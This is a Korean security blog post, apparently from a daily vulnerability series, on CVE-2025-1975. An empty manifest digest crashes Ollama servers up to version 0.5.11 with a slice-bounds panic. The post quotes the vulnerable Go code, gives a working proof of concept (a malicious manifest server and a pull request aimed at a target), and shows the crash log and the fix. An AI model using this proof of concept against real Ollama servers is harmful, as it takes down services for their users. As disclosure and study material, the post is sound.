+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+  <div class="mt-3 post-meta">
+    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+    <time datetime="2025-07-05 21:00" pubdate>
+      2025년 7월 5일 오후
+    </time>
+  </div>
+
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1k 자
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      20
+       분
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2">
+      <!--<script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
+    </div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">[하루한줄] CVE-2025-1975 : Ollama의 배열 인덱스 검증 미흡으로 인한 Denial of Service(DoS) 취약점</h1>
+                       
+            <div class="markdown-body" id="post-body">
+              <!-- <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
+              <!-- hackyboiz_horizen_index -->
+              <!--
+              <ins class="adsbygoogle"
+                   style="display:block"
+                   data-ad-client="ca-pub-3672652207808168"
+                   data-ad-slot="8887862313"
+                   data-ad-format="auto"
+                   data-full-width-responsive="true"></ins>
+              <script>
+                   (adsbygoogle = window.adsbygoogle || []).push({});
+              </script>
+              -->
+              <h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://huntr.com/bounties/921ba5d4-f1d0-4c66-9764-4f72dffe7acd">A malicious manifests can lead to DoS due to unchecked array bound access via network in ollama/ollama in ollama/ollama</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/ollama/ollama/commit/9239a254e054d24b0de3358ba8c4bd9b50730bfd">Commit 9239a25</a></li>
+</ul>
+<h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul>
+<li>Ollama &#x2264; 0.5.11</li>
+</ul>
+<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC11C;&#xBC84;&#xAC00; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC758; &#xC694;&#xCCAD;&#xC5D0; &#xC758;&#xD574; &#xBAA8;&#xB378;&#xC744; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC; &#xBC1B;&#xB294; pull &#xC694;&#xCCAD;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p>
+<pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">PullModel</span><span class="hljs-params">(ctx context.Context, name <span class="hljs-keyword">string</span>, regOpts *registryOptions, fn <span class="hljs-keyword">func</span>(api.ProgressResponse)</span>) <span class="hljs-title">error</span></span> {
+	mp := ParseModelPath(name) 
+
+	<span class="hljs-comment">// build deleteMap to prune unused layers</span>
+	deleteMap := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-keyword">string</span>]<span class="hljs-keyword">struct</span>{})
+	manifest, _, err := GetManifest(mp)
+	<span class="hljs-keyword">if</span> errors.Is(err, os.ErrNotExist) {
+		<span class="hljs-comment">// noop</span>
+	} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
+		slog.Warn(<span class="hljs-string">&quot;pulling model with bad existing manifest&quot;</span>, <span class="hljs-string">&quot;name&quot;</span>, name, <span class="hljs-string">&quot;error&quot;</span>, err)
+	} <span class="hljs-keyword">else</span> {
+		<span class="hljs-keyword">for</span> _, l := <span class="hljs-keyword">range</span> manifest.Layers {
+			deleteMap[l.Digest] = <span class="hljs-keyword">struct</span>{}{}
+		}
+		<span class="hljs-keyword">if</span> manifest.Config.Digest != <span class="hljs-string">&quot;&quot;</span> {
+			deleteMap[manifest.Config.Digest] = <span class="hljs-keyword">struct</span>{}{}
+		}
+	}
+
+	<span class="hljs-keyword">if</span> mp.ProtocolScheme == <span class="hljs-string">&quot;http&quot;</span> &amp;&amp; !regOpts.Insecure {
+		<span class="hljs-keyword">return</span> errInsecureProtocol
+	}
+
+	fn(api.ProgressResponse{Status: <span class="hljs-string">&quot;pulling manifest&quot;</span>})
+
+	manifest, err = pullModelManifest(ctx, mp, regOpts)
+	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
+		<span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">&quot;pull model manifest: %s&quot;</span>, err)
+	}
+
+	<span class="hljs-keyword">var</span> layers []Layer
+	layers = <span class="hljs-built_in">append</span>(layers, manifest.Layers...)
+	<span class="hljs-keyword">if</span> manifest.Config.Digest != <span class="hljs-string">&quot;&quot;</span> {
+		layers = <span class="hljs-built_in">append</span>(layers, manifest.Config)
+	}
+
+	skipVerify := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-keyword">string</span>]<span class="hljs-keyword">bool</span>)
+	<span class="hljs-keyword">for</span> _, layer := <span class="hljs-keyword">range</span> layers {
+		cacheHit, err := downloadBlob(ctx, downloadOpts{
+			mp:      mp,
+			digest:  layer.Digest,
+			regOpts: regOpts,
+			fn:      fn,
+		})
+		<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
+			<span class="hljs-keyword">return</span> err
+		}
+		skipVerify[layer.Digest] = cacheHit
+		<span class="hljs-built_in">delete</span>(deleteMap, layer.Digest)
+	}</code></pre>
+<p>&#xBAA8;&#xB378;&#xC744; &#xB2E4;&#xC6B4; &#xBC1B;&#xC744; &#xB54C; &#xBAA8;&#xB378;&#xC774; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xB294; &#xC11C;&#xBC84;&#xC5D0;&#xC11C; &#xBAA8;&#xB378;&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4;&#xB97C; manifest&#xB97C; &#xD1B5;&#xD574; &#xBC1B;&#xC544;&#xC624;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C; manifest &#xC548;&#xC5D0; layer &#xC815;&#xBCF4;&#xAC00; &#xC788;&#xACE0; &#xADF8; &#xC548;&#xC5D0; digest &#xC815;&#xBCF4;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; downloadBlob &#xD568;&#xC218;&#xB97C; &#xD2B8;&#xB9AC;&#xAC70; &#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. </p>
+<pre><code class="hljs go"><span class="hljs-comment">// downloadBlob downloads a blob from the registry and stores it in the blobs directory</span>
+<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">downloadBlob</span><span class="hljs-params">(ctx context.Context, opts downloadOpts)</span> <span class="hljs-params">(cacheHit <span class="hljs-keyword">bool</span>, _ error)</span></span> {
+
+	fp, err := GetBlobsPath(opts.digest)
+	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
+		<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>, err
+	}
+	
+	fi, err := os.Stat(fp)
+	<span class="hljs-keyword">switch</span> {
+	<span class="hljs-keyword">case</span> errors.Is(err, os.ErrNotExist):
+	<span class="hljs-keyword">case</span> err != <span class="hljs-literal">nil</span>:
+		<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>, err
+	<span class="hljs-keyword">default</span>:
+		opts.fn(api.ProgressResponse{
+			Status:    fmt.Sprintf(<span class="hljs-string">&quot;pulling %s&quot;</span>, opts.digest[<span class="hljs-number">7</span>:<span class="hljs-number">19</span>]), <span class="hljs-comment">// [1]</span>
+			Digest:    opts.digest,
+			Total:     fi.Size(),
+			Completed: fi.Size(),
+		})
+
+		<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>, <span class="hljs-literal">nil</span>
+	}
+</code></pre>
+<p>&#xBAA8;&#xB378;&#xC744; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBAA8;&#xB378; &#xC815;&#xBCF4;&#xB97C; &#xCC98;&#xB9AC;&#xD560; &#xB54C; digest&#xC758; &#xAE38;&#xC774;&#xAC00; 0&#xC77C; &#xACBD;&#xC6B0;, [1]&#xC5D0;&#xC11C; disgest&#xB97C; &#xD30C;&#xC2F1;&#xD560; &#xB54C; DoS&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p>
+<p>&#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; PoC &#xC11C;&#xBC84;&#xB97C; &#xAD6C;&#xD604;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
+<pre><code class="hljs go"><span class="hljs-comment">// server.go</span>
+<span class="hljs-keyword">package</span> main
+
+<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span>
+
+<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
+    gin.SetMode(gin.DebugMode)
+    r := gin.Default()
+    r.GET(<span class="hljs-string">&quot;/v2/zznq/code1/manifests/latest&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> {
+        c.JSON(<span class="hljs-number">200</span>, gin.H{
+            <span class="hljs-string">&quot;schemaVersion&quot;</span>: <span class="hljs-number">2</span>,
+            <span class="hljs-string">&quot;mediaType&quot;</span>:     <span class="hljs-string">&quot;application/vnd.docker.distribution.manifest.v2+json&quot;</span>,
+            <span class="hljs-string">&quot;config&quot;</span>: gin.H{
+                <span class="hljs-string">&quot;mediaType&quot;</span>: <span class="hljs-string">&quot;application/vnd.docker.container.image.v1+json&quot;</span>,
+                <span class="hljs-string">&quot;digest&quot;</span>:    <span class="hljs-string">&quot;&quot;</span>,
+                <span class="hljs-string">&quot;size&quot;</span>:      <span class="hljs-number">10</span>},
+            <span class="hljs-string">&quot;layers&quot;</span>: []any{
+                gin.H{
+                    <span class="hljs-string">&quot;mediaType&quot;</span>: <span class="hljs-string">&quot;application/vnd.ollama.image.license&quot;</span>,
+                    <span class="hljs-string">&quot;digest&quot;</span>:    <span class="hljs-string">&quot;&quot;</span>,
+                    <span class="hljs-string">&quot;size&quot;</span>:      <span class="hljs-number">10</span>},
+            },
+        })
+    })
+
+    r.Run(<span class="hljs-string">&quot;localhost:8080&quot;</span>)
+}</code></pre>
+<p>&#xC704;&#xC640; &#xAC19;&#xC774; &#xC11C;&#xBC84;&#xB97C; &#xC2E4;&#xD589;&#xD55C; &#xB4A4;, &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4;&#xBA74; &#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p>
+<pre><code class="hljs go"><span class="hljs-keyword">import</span> requests
+
+requests.post(<span class="hljs-string">&quot;http://{target_ollama_sever}:11434/api/pull&quot;</span>, json={<span class="hljs-string">&quot;model&quot;</span>: <span class="hljs-string">&quot;http://{malicious_server}:8080/zznq/code1&quot;</span>, <span class="hljs-string">&quot;insecure&quot;</span>: True})</code></pre>
+<ul>
+<li>Crash log:</li>
+</ul>
+<pre><code class="hljs go"><span class="hljs-number">2025</span>/<span class="hljs-number">02</span>/<span class="hljs-number">15</span> <span class="hljs-number">00</span>:<span class="hljs-number">08</span>:<span class="hljs-number">25</span> routes.<span class="hljs-keyword">go</span>:<span class="hljs-number">1186</span>: INFO server config env=<span class="hljs-string">&quot;map[HTTPS_PROXY: HTTP_PROXY: NO_PROXY: OLLAMA_DEBUG:false OLLAMA_FLASH_ATTENTION:false OLLAMA_GPU_OVERHEAD:0 OLLAMA_HOST:http://127.0.0.1:11434 OLLAMA_KEEP_ALIVE:5m0s OLLAMA_KV_CACHE_TYPE: OLLAMA_LLM_LIBRARY: OLLAMA_LOAD_TIMEOUT:5m0s OLLAMA_MAX_LOADED_MODELS:0 OLLAMA_MAX_QUEUE:512 OLLAMA_MODELS:/Users/whoami/.ollama/models OLLAMA_MULTIUSER_CACHE:false OLLAMA_NOHISTORY:false OLLAMA_NOPRUNE:false OLLAMA_NUM_PARALLEL:0 OLLAMA_ORIGINS:[http://localhost https://localhost http://localhost:* https://localhost:* http://127.0.0.1 https://127.0.0.1 http://127.0.0.1:* https://127.0.0.1:* http://0.0.0.0 https://0.0.0.0 http://0.0.0.0:* https://0.0.0.0:* app://* file://* tauri://* vscode-webview://*] OLLAMA_SCHED_SPREAD:false http_proxy: https_proxy: no_proxy:]&quot;</span>
+time=<span class="hljs-number">2025</span><span class="hljs-number">-02</span><span class="hljs-number">-15</span>T00:<span class="hljs-number">08</span>:<span class="hljs-number">25.225</span><span class="hljs-number">-08</span>:<span class="hljs-number">00</span> level=INFO source=images.<span class="hljs-keyword">go</span>:<span class="hljs-number">432</span> msg=<span class="hljs-string">&quot;total blobs: 0&quot;</span>
+time=<span class="hljs-number">2025</span><span class="hljs-number">-02</span><span class="hljs-number">-15</span>T00:<span class="hljs-number">08</span>:<span class="hljs-number">25.225</span><span class="hljs-number">-08</span>:<span class="hljs-number">00</span> level=INFO source=images.<span class="hljs-keyword">go</span>:<span class="hljs-number">439</span> msg=<span class="hljs-string">&quot;total unused blobs removed: 0&quot;</span>
+time=<span class="hljs-number">2025</span><span class="hljs-number">-02</span><span class="hljs-number">-15</span>T00:<span class="hljs-number">08</span>:<span class="hljs-number">25.225</span><span class="hljs-number">-08</span>:<span class="hljs-number">00</span> level=INFO source=routes.<span class="hljs-keyword">go</span>:<span class="hljs-number">1237</span> msg=<span class="hljs-string">&quot;Listening on 127.0.0.1:11434 (version 0.5.11)&quot;</span>
+time=<span class="hljs-number">2025</span><span class="hljs-number">-02</span><span class="hljs-number">-15</span>T00:<span class="hljs-number">08</span>:<span class="hljs-number">25.244</span><span class="hljs-number">-08</span>:<span class="hljs-number">00</span> level=INFO source=types.<span class="hljs-keyword">go</span>:<span class="hljs-number">130</span> msg=<span class="hljs-string">&quot;inference compute&quot;</span> id=<span class="hljs-number">0</span> library=metal variant=<span class="hljs-string">&quot;&quot;</span> compute=<span class="hljs-string">&quot;&quot;</span> driver=<span class="hljs-number">0.0</span> name=<span class="hljs-string">&quot;&quot;</span> total=<span class="hljs-string">&quot;10.7 GiB&quot;</span> available=<span class="hljs-string">&quot;10.7 GiB&quot;</span>
+<span class="hljs-built_in">panic</span>: runtime error: slice bounds out of <span class="hljs-keyword">range</span> [:<span class="hljs-number">19</span>] with length <span class="hljs-number">0</span>
+
+goroutine <span class="hljs-number">12</span> [running]:
+github.com/ollama/ollama/server.downloadBlob({<span class="hljs-number">0x101739c40</span>, <span class="hljs-number">0x1400052c640</span>}, {{{<span class="hljs-number">0x10133fc9a</span>, <span class="hljs-number">0x5</span>}, {<span class="hljs-number">0x14000419c80</span>, <span class="hljs-number">0xe</span>}, {<span class="hljs-number">0x14000419c8f</span>, <span class="hljs-number">0x4</span>}, {<span class="hljs-number">0x14000419c94</span>, <span class="hljs-number">0x5</span>}, ...}, ...})
+    /Users/runner/work/ollama/ollama/server/download.<span class="hljs-keyword">go</span>:<span class="hljs-number">478</span> +<span class="hljs-number">0x508</span>
+github.com/ollama/ollama/server.PullModel({<span class="hljs-number">0x101739c40</span>, <span class="hljs-number">0x1400052c640</span>}, {<span class="hljs-number">0x14000419c80</span>, <span class="hljs-number">0x20</span>}, <span class="hljs-number">0x1400052ac00</span>, <span class="hljs-number">0x14000502450</span>)
+    /Users/runner/work/ollama/ollama/server/images.<span class="hljs-keyword">go</span>:<span class="hljs-number">564</span> +<span class="hljs-number">0x600</span>
+github.com/ollama/ollama/server.(*Server).PullHandler.func1()
+    /Users/runner/work/ollama/ollama/server/routes.<span class="hljs-keyword">go</span>:<span class="hljs-number">593</span> +<span class="hljs-number">0x174</span>
+created by github.com/ollama/ollama/server.(*Server).PullHandler in goroutine <span class="hljs-number">10</span>
+    /Users/runner/work/ollama/ollama/server/routes.<span class="hljs-keyword">go</span>:<span class="hljs-number">580</span> +<span class="hljs-number">0x528</span></code></pre>
+<p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xD328;&#xCE58;&#xB294; digest&#xAC00; &#xBE48;&#xBB38;&#xC790;&#xC5F4;&#xC778;&#xC9C0; &#xC5EC;&#xBD80;&#xB97C; &#xAC80;&#xC0AC;&#xD558;&#xB3C4;&#xB85D; &#xC218;&#xC815;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                <div class="post-meta mr-3">
+                  <i class="iconfont icon-category"></i>
+                  
+                  <a class="hover-with-bg" href="/categories/1day1line/">1day1line</a>
+                  
+                </div>
+                
+                
+                <div class="post-meta">
+                  <i class="iconfont icon-tags"></i>
+                  
+                  <a class="hover-with-bg" href="/tags/dos/">dos</a>
+                  
+                  <a class="hover-with-bg" href="/tags/j0ker/">j0ker</a>
+                  
+                  <a class="hover-with-bg" href="/tags/ollama/">ollama</a>
+                  
+                  <a class="hover-with-bg" href="/tags/Improper-Validation-of-Array-Index/">Improper Validation of Array Index</a>
+                  
+                  <a class="hover-with-bg" href="/tags/go/">go</a>
+                  
+                </div>
+                
+              </div>
+
+              <div class="post-metas mb-3">
+                <a class="hover-with-bg" style="display: flex;" href="/author">
+                  <div class="link-avatar-page">
+                    <img src="/img/profile_j0ker.jpg" srcset="/img/loading.gif" alt="j0ker">
+                  </div>
+
+                  <div class="link-text">
+                    <div class="link-title">j0ker</div>
+                  </div>
+                </a>
+                <div class="link-text">
+                  <div class="link-more">
+                    <a href="/tags/j0ker">
+                      Read more
+                      <i class="iconfont icon-arrowdown"></i>
+                    </a>
+                  </div>
+                </div>
+              </div>
+
+              <hr>
+              <!--<script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
+              
+              <!--  -->
+              <p class="note note-warning">본 글은 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.ko" rel="external nofollow noopener noreferrer">CC BY-SA 4.0</a> 라이선스로 배포됩니다. 공유 또는 변경 시 반드시 출처를 남겨주시기 바랍니다.</p>
+              
+              
+              
+              <div class="post-prevnext row">
+                <article class="post-prev col-6">
+                  
+                  
+                  <a href="/2025/07/09/romi0x/1day1line0709/">
+                    <i class="iconfont icon-arrowleft"></i>
+                    <span class="hidden-mobile">[하루한줄] CVE-2025-6019 : Fedora 및 SUSE Linux에서 udisks, libblockdev와 관련된 Local Privilege Escalation</span>
+                    <span class="visible-mobile">Previous</span>
+                  </a>
+                  
+                </article>
+                <article class="post-next col-6">
+                  
+                  
+                  <a href="/2025/07/02/ogu123/cve-2025-1533/">
+                    <span class="hidden-mobile">[하루한줄] CVE-2025-1533: ASUS AsIO3.sys의 Stack Overflow 취약점</span>
+                    <span class="visible-mobile">Next</span>
+                    <i class="iconfont icon-arrowright"></i>
+                  </a>
+                  
+                </article>
+              </div>
+              
+            </div>
+            
+            <!-- Embed Section -->
+            <div style="width: 100%; height: 210px; margin-bottom: 50px; overflow: hidden;">
+              <iframe src="https://maily.so/hackyboiz/embed?src=embed" style="width: 100%; height: 100%; border: none;" frameborder="0"></iframe>
+            </div>            
+
+            
+            <!-- Comments -->
+            <article class="comments" id="comments">
+              
+              
+  <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+      var disqus_config = function () {
+        this.page.url = 'https://hackyboiz.github.io/2025/07/05/j0ker/2025-07-05/';
+        this.page.identifier = '/2025/07/05/j0ker/2025-07-05/';
+      };
+      function loadDisqus() {
+        (function () {
+          var d = document,
+            s = d.createElement('script');
+          s.src = '//' + 'hackyboiz' + '.disqus.com/embed.js';
+          s.setAttribute('data-timestamp', new Date());
+          (d.head || d.body).appendChild(s);
+        })();
+      }
+      waitElementVisible('disqus_thread', loadDisqus);
+    </script>
+    <noscript>Please enable JavaScript to view the
+      <a target="_blank" href="https://disqus.com/?ref_noscript" rel="external nofollow noopener noreferrer">comments powered by Disqus.</a>
+    </noscript>
+  </div>
+
+
+            </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+    <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+      <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
+</div>
+
+    </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="external nofollow noopener noreferrer"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="external nofollow noopener noreferrer">
+        <span>Fluid</span></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<script src="/js/debouncer.js"></script>
+<script src="/js/main.js"></script>
+
+<!-- Plugins -->
+
+
+  
+    <script src="/js/lazyload.js"></script>
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script>
+  <script src="/js/clipboard-use.js"></script>
+
+
+
+
+
+
+
+  <script src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "[하루한줄] CVE-2025-1975 : Ollama의 배열 인덱스 검증 미흡으로 인한 Denial of Service(DoS) 취약점&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+    <!-- Google Analytics -->
+    <script defer>
+      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
+      ga.l = +new Date;
+      ga('create', 'UA-177243668-2', 'auto');
+      ga('send', 'pageview');
+    </script>
+    <script async src="https://www.google-analytics.com/analytics.js"></script>
+  
+
+  
+    <!-- Google gtag.js -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-177243668-2"></script>
+    <script defer>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-177243668-2');
+    </script>
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+</body>
+</html>
